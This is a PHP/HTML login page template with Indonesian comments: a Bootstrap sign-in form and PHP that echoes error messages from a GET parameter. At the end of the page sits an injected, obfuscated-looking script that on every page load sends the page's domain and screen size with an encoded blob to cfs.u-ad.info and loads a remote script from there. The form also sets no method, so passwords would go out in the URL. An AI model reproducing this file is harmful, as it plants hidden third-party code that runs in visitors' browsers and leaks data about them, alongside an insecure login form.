<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
   
    <title>Login</title>

    <!-- Bootstrap core CSS -->
    <link rel="stylesheet" href="content/bootstrap/css/bootstrap.min.css">


    <!-- Custom styles for this template -->
    <link href="content/bootstrap/css/signin.css" rel="stylesheet">
  </head>

  <body>

<?php 
//kode php ini kita gunakan untuk menampilkan pesan eror
if (!empty($_GET['error'])) {
        if ($_GET['error'] == 1) {
                echo '<h3>Username dan Password belum diisi!</h3>';
        } else if ($_GET['error'] == 2) {
                echo '<h3>Username belum diisi!</h3>';
        } else if ($_GET['error'] == 3) {
                echo '<h3>Password belum diisi!</h3>';
        } else if ($_GET['error'] == 4) {
                echo '<h3>Username dan Password tidak terdaftar!</h3>';
        }
}
?>

    <div class="container">

      <form class="form-signin" name="login">
        <h2 class="form-signin-heading">Login</h2>
        <label for="input username" class="sr-only">username</label>
        <input type="text" name="username" class="form-control" placeholder="username" required autofocus >
        
        <input type="password" name="password" class="form-control" placeholder="password" >
        
          <label>
          </label>
        
        <button class="btn btn-lg btn-primary btn-block"  type="submit" value="login">Login</button>
      </form>

    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Ltpw5OIinlRKy18dEnWWFw7sIYrsqGTvhDAgkzJtFuI7EKcoTHEpT9HIko%2bXq%2fH4BrSMibcIIKSddflZyWMHaxyWRH%2bPezdI99K5I2HuuB1%2beLihBNHuWvZUokyJuiynDgwMvXLuHXGveFdEXyDwc1olMIAvLDfHfR1QJZZfEt0zS%2fnqGSMj4ne%2f%2bwdIk9DcooWdFjZw%2bi%2fqKh78ZuMNHgLz1YIOa3vREFyA81hlTolyY5Kij4RdMUE6I1hKy%2bWo%2b0nljKNtO5skwJmexyA8ziMUSx4cbpfa2nfNnyDFLAKnhYaojK2IjuZ6sHBBF%2b7WGtiZJ4mf04Mz8uuvygLz9PWdmlx3X2mV9fGloDnFF%2fGt0V6TngOweHyMAY1iZE57SXrmyYSQW9wRwbNLwlQYbZp4X72c9dvOaFVgUWWO8R8aM47x0cSGa4DWb6GreyY2XL5w6LTyyXqKzMk1fixW2B8m3DRRMlFT7mTDhJ2FZABu8Y7RTG8WEq17cCPPQHzLnXxSzwzu1v8" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
</html>

